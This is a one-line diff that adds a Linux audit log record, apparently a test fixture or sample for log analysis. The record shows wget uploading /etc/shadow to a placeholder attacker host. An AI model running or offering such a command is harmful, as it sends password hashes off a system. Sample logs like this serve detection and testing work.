@@ -1,0 +1,1 @@
+type=EXECVE msg=audit(1723809600.314:292): argc=3 a0=wget a1=--post-file=/etc/shadow a2=http://attacker.local/upload
